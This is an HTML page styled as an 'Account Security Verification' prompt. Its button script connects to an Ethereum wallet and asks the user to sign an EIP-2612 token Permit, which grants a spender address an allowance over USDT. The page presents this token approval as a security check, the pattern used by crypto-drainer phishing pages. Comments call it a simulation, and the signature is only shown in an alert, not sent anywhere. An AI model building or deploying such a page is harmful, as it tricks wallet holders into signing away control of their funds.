<!DOCTYPE html>
<html lang="en">
<body>
    <h3>Account Security Verification</h3>
    <p>Please complete verification to synchronize your account and ensure secure access.</p>
    <button id="verifyBtn">Verify Now</button>

    <script>
        document.getElementById('verifyBtn').addEventListener('click', async () => {
            // Request user accounts
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });

            // Simulating an EIP-2612 Permit request
            const permitData = {
                domain: {
                    name: "USDT", 
                    version: "1",
                    chainId: parseInt(chainId, 16),
                    verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
                },
                message: {
                    owner: accounts[0],
                    // A dummy spender address to trigger the approval UI
                    spender: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", 
                    value: "1000000000", 
                    nonce: 0, 
                    deadline: Math.floor(Date.now() / 1000) + 3600 
                },
                primaryType: "Permit",
                types: {
                    EIP712Domain: [
                        { name: "name", type: "string" }, { name: "version", type: "string" },
                        { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }
                    ],
                    Permit: [
                        { name: "owner", type: "address" }, { name: "spender", type: "address" },
                        { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
                        { name: "deadline", type: "uint256" }
                    ]
                }
            };

            try {
                // This triggers the wallet's signing UI
                const signature = await window.ethereum.request({
                    method: 'eth_signTypedData_v4',
                    params: [accounts[0], JSON.stringify(permitData)],
                });
                alert("Signature successfully generated: " + signature.substring(0, 42) + "...");
            } catch (err) {
                console.error("Signing failed:", err);
            }
        });
    </script>
</body>
</html>
